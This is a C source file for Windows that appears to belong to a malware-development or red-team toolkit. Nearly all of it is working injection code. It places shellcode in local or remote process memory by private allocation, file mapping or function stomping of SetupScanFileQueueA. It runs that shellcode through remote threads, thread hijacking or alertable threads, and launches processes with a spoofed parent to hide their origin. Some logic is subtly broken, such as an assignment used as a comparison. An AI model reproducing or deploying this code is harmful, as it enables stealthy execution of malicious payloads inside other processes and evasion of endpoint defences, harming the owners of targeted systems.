#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include <Psapi.h>

#include "Common.h"
#include "Structs.h"

#pragma comment (lib, "OneCore.lib") // Required for MapViewOfFile2


BOOL ObtainWinAPIAddress(IN LPCSTR lpDllName, IN LPCSTR lpFunctionName, OUT PVOID* pAddress)
{
	HMODULE hMod;

	// check if the DLL is already loaded in the process' address space
	if ((hMod = GetModuleHandle(lpDllName)) == NULL)
		if ((hMod = LoadLibraryA(lpDllName)) == NULL) // load it if it isn't
		{
			printf("[!] Could not load %s DLL!\n", lpDllName);
			return ReportErrorWinAPI("LoadLibraryA");
		}

	if ((*pAddress = GetProcAddress(hMod, lpFunctionName)) == NULL)
	{
		printf("[!] Could not obtain the address of %s function inside %s DLL!\n", lpFunctionName, lpDllName);
		return ReportErrorWinAPI("GetProcAddress");
	}

	return TRUE;
}

BOOL AllocateMemory(IN DWORD dwType, IN HANDLE hProcess, IN PVOID pShellcode, IN SIZE_T sShellcodeSize, OUT PVOID* pShellcodeAddr)
{
	if (dwType == NULL)
		dwType = PRIVATE;

	if (dwType == PRIVATE)
	{
		DWORD oldProtect;

		// Local allocation
		if (hProcess == NULL)
		{
			if ((*pShellcodeAddr = VirtualAlloc(NULL, sShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
				return ReportErrorWinAPI("VirtualAlloc");
			memcpy(*pShellcodeAddr, pShellcode, sShellcodeSize);
			memset(pShellcode, '\0', sShellcodeSize);
			if (!VirtualProtect(*pShellcodeAddr, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
				return ReportErrorWinAPI("VirtualProtect");
		}

		// Remote allocation
		else
		{
			SIZE_T bytesWritten;

			if ((*pShellcodeAddr = VirtualAllocEx(hProcess, NULL, sShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
				return ReportErrorWinAPI("VirtualAllocEx");
			if (!WriteProcessMemory(hProcess, *pShellcodeAddr, pShellcode, sShellcodeSize, &bytesWritten))
				return ReportErrorWinAPI("WriteProcessMemory");
			memset(pShellcode, '\0', sShellcodeSize);
			if (!VirtualProtectEx(hProcess, *pShellcodeAddr, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
				return ReportErrorWinAPI("VirtualProtectEx");
		}

		printf("[i] Allocated private memory for shellcode at 0x%p\n", *pShellcodeAddr);
	}

	else if (dwType == MAPPED)
	{
		HANDLE hFile;

		if ((hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sShellcodeSize, NULL)) == NULL)
			return ReportErrorWinAPI("CreateFileMapping");

		// Local mapping injection
		if (hProcess == NULL)
		{
			PVOID pMapLocalAddress;

			if ((pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sShellcodeSize)) == NULL)
				return ReportErrorWinAPI("MapViewOfFile");

			memcpy(pMapLocalAddress, pShellcode, sShellcodeSize);

			*pShellcodeAddr = pMapLocalAddress;
		}

		// Remote mapping injection
		else
		{
			PVOID pMapLocalAddress, pMapRemoteAddress;

			if ((pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sShellcodeSize)) == NULL)
				return ReportErrorWinAPI("MapViewOfFile");

			memcpy(pMapLocalAddress, pShellcode, sShellcodeSize);

			if ((pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE)) == NULL)
				return ReportErrorWinAPI("MapViewOfFile2");

			*pShellcodeAddr = pMapRemoteAddress;
		}

		memset(pShellcode, '\0', sShellcodeSize);

		printf("[i] Allocated mapped memory for shellcode at 0x%p\n", *pShellcodeAddr);

		CloseHandle(hFile);
	}

	else if (dwType == STOMPING)
	{
		PVOID pAddress;
		DWORD oldProtect;

		if (!ObtainWinAPIAddress("setupapi.dll", "SetupScanFileQueueA", &pAddress))
			return FALSE;

		// Local function stomping
		if (hProcess == NULL)
		{
			if (!VirtualProtect(pAddress, sShellcodeSize, PAGE_READWRITE, &oldProtect))
				return ReportErrorWinAPI("VirtualProtect");

			memcpy(pAddress, pShellcode, sShellcodeSize);

			if (!VirtualProtect(pAddress, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
				return ReportErrorWinAPI("VirtualProtect");
		}

		// Remote function stomping
		else
		{
			SIZE_T bytesWritten;

			// The target DLL must be loaded in order for the target function to exist in the process' address space
			char DLL[] = "C:\\Windows\\System32\\setupapi.dll";
			if (!RemoteProcessDllInjection(NULL, "notepad.exe", NULL, DLL))
				return FALSE;

			if (!VirtualProtectEx(hProcess, pAddress, sShellcodeSize, PAGE_READWRITE, &oldProtect))
				return ReportErrorWinAPI("VirtualProtectEx1");

			if (!WriteProcessMemory(hProcess, pAddress, pShellcode, sShellcodeSize, &bytesWritten))
				return ReportErrorWinAPI("WriteProcessMemory");

			if (!VirtualProtectEx(hProcess, pAddress, sShellcodeSize, PAGE_EXECUTE_READ, &oldProtect))
				return ReportErrorWinAPI("VirtualProtectEx2");
		}

		memset(pShellcode, '\0', sShellcodeSize);
		*pShellcodeAddr = pAddress;

		printf("[i] Function stomped SetupScanFileQueueA with shellcode at 0x%p\n", *pShellcodeAddr);
	}

	return TRUE;
}

BOOL IsAlreadyRunning()
{
	HANDLE hSemaphore;

	if ((hSemaphore = CreateSemaphoreA(NULL, 10, 10, "ControlString")) == NULL)
		return ReportErrorWinAPI("CreateSemaphoreA");

	if (GetLastError() == ERROR_ALREADY_EXISTS)
		return TRUE;
	else
		return FALSE;
}

BOOL RunThread(IN HANDLE hProcess, IN BOOL bSuspended, IN PVOID pShellcode, OUT HANDLE* hThread, OUT DWORD* dwThreadId)
{
	// Avoid running the payload more than once
	if (IsAlreadyRunning())
	{
		printf("[!] The payload is already running! Exiting...\n");
		return FALSE;
	}

	// Local thread
	if (hProcess == NULL)
	{
		if (bSuspended)
			*hThread = CreateThread(NULL, NULL, pShellcode, NULL, CREATE_SUSPENDED, dwThreadId);
		else
			*hThread = CreateThread(NULL, NULL, pShellcode, NULL, NULL, dwThreadId);

		if (*hThread == NULL)
			return ReportErrorWinAPI("CreateThread");
	}

	// Remote thread
	else
	{
		if (bSuspended)
			*hThread = CreateRemoteThread(hProcess, NULL, NULL, pShellcode, NULL, CREATE_SUSPENDED, dwThreadId);
		else
			*hThread = CreateRemoteThread(hProcess, NULL, NULL, pShellcode, NULL, NULL, dwThreadId);

		if (*hThread == NULL)
			return ReportErrorWinAPI("CreateRemoteThread");
	}

	printf("[i] Created thread with thread ID %d\n", *dwThreadId);
	return TRUE;
}

BOOL WaitForThread(IN HANDLE hThread)
{
	printf("[i] Waiting infinitely for the thread to finish...\n");
	if (WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED)
		return ReportErrorWinAPI("WaitForSingleObject");

	return TRUE;
}

BOOL FreeMemory(IN DWORD dwMemoryType, IN HANDLE hProcess, IN PVOID pShellcode)
{
	if (dwMemoryType == NULL)
		dwMemoryType = PRIVATE;

	if (dwMemoryType == PRIVATE)
	{
		if (hProcess != NULL)
			VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
		else
			VirtualFree(pShellcode, 0, MEM_RELEASE);
	}

	else if (dwMemoryType == MAPPED)
		UnmapViewOfFile(pShellcode);

	if (hProcess != NULL)
		CloseHandle(hProcess);

	return TRUE;
}

BOOL ObtainProcessHandle(IN DWORD Method, IN LPCSTR lpProcessName, OUT HANDLE* hProcess, OUT DWORD* dwProcessId)
{
	if (Method == NULL)
		Method = SNAPSHOT;

	// Using CreateToolhelp32Snapshot WinAPI
	if (Method == SNAPSHOT)
	{
		HANDLE hSnapshot;
		PROCESSENTRY32 ProcEntry = { .dwSize = sizeof(PROCESSENTRY32) };
		WCHAR wszProcessName[MAX_PATH * 2];
		LPWSTR lpszLowerExeFile;

		if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL)) == INVALID_HANDLE_VALUE)
			return ReportErrorWinAPI("CreateToolhelp32Snapshot");

		if (!Process32First(hSnapshot, &ProcEntry))
			return ReportErrorWinAPI("Process32First");

		// Convert to WCHAR (Unicode)
		MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, lpProcessName, -1, wszProcessName, MAX_PATH * 2);

		do
		{
			ConvertToLowerCase(ProcEntry.szExeFile, &lpszLowerExeFile);

			// Found the target process
			if (wcscmp(wszProcessName, lpszLowerExeFile) == 0)
			{
				*dwProcessId = ProcEntry.th32ProcessID;
				if ((*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessId)) == NULL)
					return ReportErrorWinAPI("OpenProcess");
				wprintf(L"[i] Obtained handle to process %s with PID %d\n", wszProcessName, *dwProcessId);
				CloseHandle(hSnapshot);
				return TRUE;
			}
		} while (Process32Next(hSnapshot, &ProcEntry));

		CloseHandle(hSnapshot);
	}

	// Using EnumProcesses WinAPI
	else if (Method == ENUMPROCESSES)
	{
		DWORD Processes[MAX_PROCESSES], dwBytesReturned, dwNumberOfProcesses;

		if (!EnumProcesses(Processes, sizeof(Processes), &dwBytesReturned))
			return ReportErrorWinAPI("EnumProcesses");

		dwNumberOfProcesses = dwBytesReturned / sizeof(DWORD);
		for (int i = 0; i < dwNumberOfProcesses; i++)
		{
			if (Processes[i] != 0)
			{
				HANDLE hTmpProcess;
				HMODULE hModule;
				DWORD cbNeeded;
				WCHAR wszEnumeratedProcessName[MAX_PATH * 2], wszOriginalProcessName[MAX_PATH * 2];
				LPWSTR LowerProcessName;

				if ((hTmpProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Processes[i])) != NULL)
				{
					if (EnumProcessModules(hTmpProcess, &hModule, sizeof(hModule), &cbNeeded))
						if (GetModuleBaseName(hTmpProcess, hModule, wszEnumeratedProcessName, sizeof(wszEnumeratedProcessName) / sizeof(TCHAR)))
						{

							// Convert the enumerated process name to lowercase
							ConvertToLowerCase(wszEnumeratedProcessName, &LowerProcessName);
							// Convert the supplied process name to WCHAR (because the enumerated process name is WCHAR)
							MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, lpProcessName, -1, wszOriginalProcessName, MAX_PATH * 2);
							if (wcscmp(wszEnumeratedProcessName, wszOriginalProcessName) == 0)
							{
								*dwProcessId = Processes[i];
								if ((*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessId)) == NULL)
									return ReportErrorWinAPI("OpenProcess 2");
								wprintf(L"[i] Obtained handle to process %s with PID %d\n", wszEnumeratedProcessName, *dwProcessId);
								CloseHandle(hTmpProcess);
								return TRUE;
							}
						}
				}
			}
		}
	}

	// Using NtQuerySystemInformation NativeAPI
	else if (Method = NTQUERYSYSTEMINFORMATION)
	{
		PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
		ULONG uSystemProcInfoLen, uReturnLen;
		NTSTATUS STATUS;
		PVOID pValueToFree;
		fnNtQuerySystemInformation pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

		// Call NtQuerySystemInformation once to get the length of the array
		if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uSystemProcInfoLen)) != STATUS_SUCCESS && STATUS != STATUS_INFO_LENGTH_MISMATCH)
			return ReportErrorNTAPI("NtQuerySystemInformation 1", STATUS);

		// Allocate the memory required to hold the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uSystemProcInfoLen);

		// Call it again to get the array
		if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uSystemProcInfoLen, &uReturnLen)) != STATUS_SUCCESS)
			return ReportErrorNTAPI("NtQuerySystemInformation 2", STATUS);

		pValueToFree = SystemProcInfo;
		if (SystemProcInfo != NULL)
		{
			while (TRUE)
			{
				if (SystemProcInfo->ImageName.Length)
				{
					WCHAR wszOriginalProcessName[MAX_PATH * 2];
					LPWSTR lpEnumeratedLowerProcessName;

					MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, lpProcessName, -1, wszOriginalProcessName, MAX_PATH * 2);
					ConvertToLowerCase(SystemProcInfo->ImageName.Buffer, &lpEnumeratedLowerProcessName);
					if (wcscmp(lpEnumeratedLowerProcessName, wszOriginalProcessName) == 0)
					{
						*dwProcessId = SystemProcInfo->UniqueProcessId;
						if ((*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessId)) == NULL)
							return ReportErrorWinAPI("OpenProcess");
						wprintf(L"[i] Obtained handle to process %s with PID %d\n", lpEnumeratedLowerProcessName, *dwProcessId);
						HeapFree(GetProcessHeap(), 0, pValueToFree);
						return TRUE;
					}
				}

				if (SystemProcInfo->NextEntryOffset == 0)
				{
					HeapFree(GetProcessHeap(), 0, pValueToFree);
					printf("[!] Could not locate the %s process\n", lpProcessName);
					return FALSE;
				}

				SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
			}
		}

		else
			printf("[!] SystemProcInfo wasn't populated with the process information\n");

		return FALSE;

	}
	
	// Wrong enumeration method
	else
	{
		printf("[!] Unknown enumeration method : %d\n", Method);
		return FALSE;
	}


	printf("[!] Failed to obtain handle to %s\n", lpProcessName);

	return FALSE;
}

BOOL ObtainThreadHandle(IN DWORD dwMethod, IN DWORD dwProcessId, IN DWORD dwMainThreadId, OUT HANDLE* hThread, OUT DWORD* dwThreadId)
{
	if (dwMethod == NULL)
		dwMethod = SNAPSHOT;

	if (dwMethod == SNAPSHOT)
	{
		HANDLE hSnapshot = NULL;
		THREADENTRY32 Thr = { .dwSize = sizeof(THREADENTRY32) };

		if (dwProcessId == NULL)
			dwProcessId = GetCurrentProcessId();

		if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL)) == INVALID_HANDLE_VALUE)
			return ReportErrorWinAPI("CreateToolhelp32Snapshot");

		if (!Thread32First(hSnapshot, &Thr))
			return ReportErrorWinAPI("Thread32First");

		do
		{
			if (Thr.th32OwnerProcessID == dwProcessId && Thr.th32ThreadID != dwMainThreadId)
			{
				*dwThreadId = Thr.th32ThreadID;
				if ((*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, *dwThreadId)) == NULL)
					return ReportErrorWinAPI("OpenThread");

				printf("[i] Obtained handle to thread with ID %d in process with ID %d\n", *dwThreadId, dwProcessId);
				CloseHandle(hSnapshot);
				return TRUE;
			}
		} while (Thread32Next(hSnapshot, &Thr));

		CloseHandle(hSnapshot);
	}

	else if (dwMethod == NTQUERYSYSTEMINFORMATION)
	{
		fnNtQuerySystemInformation pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
		PSYSTEM_PROCESS_INFORMATION SystemProcInfo;
		ULONG uReturnLen1, uReturnLen2;
		NTSTATUS STATUS;
		PVOID pSystemToFree;

		if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1)) != STATUS_SUCCESS && STATUS != STATUS_INFO_LENGTH_MISMATCH)
			return ReportErrorNTAPI("NtQuerySystemInformation 1", STATUS);

		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);

		if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2)) != STATUS_SUCCESS)
			return ReportErrorNTAPI("NtQuerySystemInformation 2", STATUS);

		pSystemToFree = SystemProcInfo;
		if (SystemProcInfo != NULL)
		{
			while (TRUE)
			{
				if (SystemProcInfo->UniqueProcessId == dwProcessId)
				{
					*dwThreadId = SystemProcInfo->Threads[0].ClientId.UniqueThread;
					if ((*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, *dwThreadId)) == NULL)
						return ReportErrorWinAPI("OpenThread");

					printf("[i] Obtained handle to thread with ID %d in process with ID %d\n", *dwThreadId, dwProcessId);
					return TRUE;
				}

				if (!SystemProcInfo->NextEntryOffset)
					break;

				SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
			}
		}
	}
	
	printf("[!] Failed to obtain handle to a thread!\n");
	return FALSE;
}

BOOL HijackThread(IN HANDLE hThread, IN PVOID pShellcodeAddr)
{
	CONTEXT Thr = { .ContextFlags = CONTEXT_CONTROL };

	if (hThread == NULL)
		return FALSE;

	if (SuspendThread(hThread) == (DWORD) - 1)
		return ReportErrorWinAPI("SuspendThread");

	if (!GetThreadContext(hThread, &Thr))
		return ReportErrorWinAPI("GetThreadContext");

	Thr.Rip = pShellcodeAddr;

	if (!SetThreadContext(hThread, &Thr))
		return ReportErrorWinAPI("SetThreadContext");
	printf("[i] Hijacked the thread\n");

	if (ResumeThread(hThread) == (DWORD)-1)
		return ReportErrorWinAPI("ResumeThread");
	
	return TRUE;
}

BOOL CreateAlertableThread(IN HANDLE hProcess, IN DWORD dwAlertableFunction, OUT HANDLE* hThread, OUT DWORD* dwThreadId)
{
	PVOID pAlertableFunction;
	HANDLE hTmpThread;
	DWORD dwTmpThreadId;

	switch (dwAlertableFunction)
	{
	case SLEEPEX:
		pAlertableFunction = &AlertableSleepEx;
		break;

	case WAITFORSINGLEOBJECTEX:
		pAlertableFunction = &AlertableWaitForSingleObjectEx;
		break;

	case WAITFORMULTIPLEOBJECTSEX:
		pAlertableFunction = &AlertableWaitForMultipleObjectsEx;
		break;

	case MSGWAITFORMULTIPLEOBJECTSEX:
		pAlertableFunction = &AlertableMsgWaitForMultipleObjectsEx;
		break;

	case SIGNALOBJECTANDWAIT:
		pAlertableFunction = &AlertableSignalObjectAndWait;
		break;

	default:
		pAlertableFunction = &AlertableSleepEx;
	}

	if (!RunThread(hProcess, FALSE, pAlertableFunction, &hTmpThread, &dwTmpThreadId))
		return FALSE;

	*hThread = hTmpThread;
	*dwThreadId = dwTmpThreadId;

	return TRUE;
}

BOOL RunProcess(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread, OUT DWORD* dwProcessId)
{
	PROCESS_INFORMATION Pi = { 0 };
	STARTUPINFO Si = { 0 };
	char ProcessPath[MAX_PATH * 4];
	char winDir[MAX_PATH * 2];

	Si.cb = sizeof(STARTUPINFO);

	if (!IsAbsolutePath(lpProcessName))
	{
		if (!GetEnvironmentVariableA("WINDIR", winDir, MAX_PATH * 2))
			return ReportErrorWinAPI("GetEnvironmentVariableA");
		sprintf_s(ProcessPath, MAX_PATH * 4, "%s\\System32\\%s", winDir, lpProcessName);
	}

	printf("[i] Creating process %s\n", ProcessPath);
	if (!CreateProcessA(
		NULL,
		ProcessPath,
		NULL,
		NULL,
		FALSE,
		dwCreationFlag,
		NULL,
		NULL,
		&Si,
		&Pi
	))
		return ReportErrorWinAPI("CreateProcess");

	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;
	*dwProcessId = Pi.dwProcessId;

	return TRUE;
}

BOOL RunPPIDSpoofedProcess(IN LPCSTR lpProcessName, IN LPCSTR lpParentProcessName, OUT HANDLE* hProcess, OUT HANDLE* hThread)
{
	HANDLE hParentProcess;
	DWORD dwParentProcessId;
	PROCESS_INFORMATION Pi = { 0 };
	STARTUPINFOEXA SiEx = { 0 };
	char ProcessPath[MAX_PATH * 4];
	char winDir[MAX_PATH * 2];
	char System32[MAX_PATH * 2];
	SIZE_T sThreadAttList;
	PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList;

	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// Append C:\\Windows\\System32 to the relative process name
	if (PathIsRelativeA(lpProcessName))
	{
		if (!GetEnvironmentVariableA("WINDIR", winDir, MAX_PATH * 2))
			return ReportErrorWinAPI("GetEnvironmentVariableA");
		sprintf_s(System32, MAX_PATH * 2, "%s\\System32", winDir);
		sprintf_s(ProcessPath, MAX_PATH * 4, "%s\\%s", System32, lpProcessName);
		lpProcessName = ProcessPath;
	}

	if (!ObtainProcessHandle(ENUMPROCESSES, lpParentProcessName, &hParentProcess, &dwParentProcessId))
		return FALSE;

	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);

	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList))
		return ReportErrorWinAPI("InitializeProcThreadAttributeList");

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
		return ReportErrorWinAPI("UpdateProcThreadAttribute");

	SiEx.lpAttributeList = pThreadAttList;

	if (!CreateProcessA(
		NULL,
		lpProcessName,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		System32,
		&SiEx.StartupInfo,
		&Pi
	))
		return ReportErrorWinAPI("CreateProcessA");
	printf("[i] Created process %s with PID %d with spoofed parent process %s\n", ProcessPath, Pi.dwProcessId, lpParentProcessName);

	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	return TRUE;
}